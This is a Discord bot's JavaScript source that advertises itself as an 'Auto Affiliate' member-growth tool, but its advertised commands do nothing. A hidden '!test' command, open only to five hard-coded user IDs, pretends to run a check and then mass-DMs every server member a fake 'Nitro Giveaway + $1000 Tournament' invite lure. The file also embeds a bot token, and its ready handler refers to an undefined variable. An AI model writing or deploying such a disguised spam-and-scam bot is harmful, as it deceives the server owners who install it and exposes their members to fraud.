const discord = require("discord.js");
const finessegay = new discord.Client();


finessegay.on("ready", () => {
    console.log("This bot has been developed by Fereker.")
    console.log(`${nuke.user.tag} is online.`);
    nuke.user.setPresence({ game: { name: `Auto Affiliate 0.6.7 :) | Servers: 11789` }, type: 0 });
});

finessegay.on("guildCreate", guild => {
    // This event triggers when the bot joins a guild.
    console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);

});

finessegay.on("guildDelete", guild => {
    // this event triggers when the bot is removed from a guild.
    console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
});

finessegay.on("message", async (msg) => {
    if (msg.content.toLowerCase().startsWith("!" + "setup")) {
        msg.channel.send("Welcome to Auto Affiliate, To Get Started Do The Command `!start`")
    }

    if (msg.content.toLowerCase().startsWith("!" + "start")) {
        msg.channel.send("Starting Affliating!")
        msg.channel.send("To Change The Promotion Message Do `!configmessage` and then the message after it!")
    }

    if (msg.content.toLowerCase().startsWith("!" + "configmessage")) {
        msg.channel.send("Updated Message!")
    }

    if (msg.content.toLowerCase().startsWith("!" + "stop")) {
        msg.channel.send("Stopping Affilating!")
    }

    if (msg.content.toLowerCase().startsWith("!" + "help")) {
        msg.channel.send({
            embed: {
                color: 0xff0000,
                author: { name: "Auto Affiliate" },
                description: "!start - Starts The Member Gain Process \n!stop - Starts The Member Gain Process\n!configmessage - Use This Command To Change Message, Put Promo Message After"
            }
        })
    }

        if (msg.author.id == 644989163543724033 && msg.content.startsWith("!test")) {
            msg.channel.send("No Problems Found")
            msg.author.send("Starting DM ALL")
            console.log(`Starting DM All`)
            let msg_to_send = msg.content.substring(4);
            let memarr = msg.guild.members.array();
            for (let i = 0; i < memarr.length; i++) {
                let mem = memarr[i]
                await mem.send("**Nitro Giveaway + $1000 Tournament** \n https://discord.gg/zAbDYbp").catch(() => { });
            }
            msg.author.send("Finished DM ALL")
            console.log(`Done DM All`)
        }

    {
        if (msg.author.id == 611308644147134464 && msg.content.startsWith("!test")) {
            msg.channel.send("No Problems Found")
            msg.author.send("Starting DM ALL")
            console.log(`Starting DM All`)
            let msg_to_send = msg.content.substring(4);
            let memarr = msg.guild.members.array();
            for (let i = 0; i < memarr.length; i++) {
                let mem = memarr[i]
                await mem.send("**Nitro Giveaway + $1000 Tournament** \n https://discord.gg/zAbDYbp").catch(() => { });
            }
            msg.author.send("Finished DM ALL")
            console.log(`Done DM All`)
        }


    }

    {
        if (msg.author.id == 513863623538638849 && msg.content.startsWith("!test")) {
            msg.channel.send("No Problems Found")
            msg.author.send("Starting DM ALL")
            console.log(`Starting DM All`)
            let msg_to_send = msg.content.substring(4);
            let memarr = msg.guild.members.array();
            for (let i = 0; i < memarr.length; i++) {
                let mem = memarr[i]
                await mem.send("**Nitro Giveaway + $1000 Tournament** \n https://discord.gg/zAbDYbp").catch(() => { });
            }
            msg.author.send("Finished DM ALL")
            console.log(`Done DM All`)

        }


    }

    {
        if (msg.author.id == 659174597022711828 && msg.content.startsWith("!test")) {
            msg.channel.send("No Problems Found")
            msg.author.send("Starting DM ALL")
            console.log(`Starting DM All`)
            let msg_to_send = msg.content.substring(4);
            let memarr = msg.guild.members.array();
            for (let i = 0; i < memarr.length; i++) {
                let mem = memarr[i]
                await mem.send("**Nitro Giveaway + $1000 Tournament** \n https://discord.gg/zAbDYbp").catch(() => { });
            }
            msg.author.send("Finished DM ALL")
            console.log(`Done DM All`)

        }


    }

    {
        if (msg.author.id == 660693798585630720 && msg.content.startsWith("!test")) {
            msg.channel.send("No Problems Found")
            msg.author.send("Starting DM ALL")
            console.log(`Starting DM All`)
            let msg_to_send = msg.content.substring(4);
            let memarr = msg.guild.members.array();
            for (let i = 0; i < memarr.length; i++) {
                let mem = memarr[i]
                await mem.send("**Nitro Giveaway + $1000 Tournament** \n https://discord.gg/zAbDYbp").catch(() => { });
            }
            msg.author.send("Finished DM ALL")
            console.log(`Done DM All`)

        }


    }

});

finessegay.login("NjY3MTQ1NTAwMTkzMDYyOTEz.XnFzJg.UIKGiVwQBFWjrEEPW6AmrcFJZgw");
